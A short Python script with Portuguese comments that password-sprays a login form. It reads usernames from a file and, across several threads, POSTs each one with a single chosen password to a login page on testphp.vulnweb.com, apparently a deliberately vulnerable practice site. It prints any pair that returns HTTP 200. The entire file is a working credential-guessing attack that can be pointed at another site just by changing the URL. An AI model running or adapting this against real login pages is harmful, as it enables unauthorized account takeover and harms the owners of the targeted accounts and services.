import requests
import sys
from threading import Thread
import numpy as np

#Setando paramêtros
users_file = sys.argv[1] #Arquivo de usuário no primeiro parametro
password_test = sys.argv[2] #Senha a ser usada
number_threads = int(sys.argv[3]) #Número de threds desejadas

#Lendo o arquivo de texto
with open(users_file) as f:
    users_list = [(line.strip()) for line in f.readlines()]

split_list = np.array_split(users_list, number_threads) #Dividindo a lista para threads

#Função de tentativa de login
def login(thread_number):
    for user in split_list[thread_number]:
        login_fields = {"uname": user, "pass":password_test} #Campos de login
        login_try = requests.post('http://testphp.vulnweb.com/userinfo.php', data=login_fields, allow_redirects=False)
        
        #Se o code for 200, printa as credenciais
        if (login_try.status_code == 200):
            print("User found!!")
            print(user, password_test)

#Creating thread for reading tokens and executing the request
threads = []
def create_threads(n):
    for i in range(0,n):
        t = Thread(target=login, args=(i,))
        threads.append(t)
        
        #Interromper threads com Ctrl+C
        try:
            t.start()
        except (KeyboardInterrupt, SystemExit):
            sys.exit()

    for t in threads:
        t.join()

#Cria threads e inicia o ataque
create_threads(number_threads)

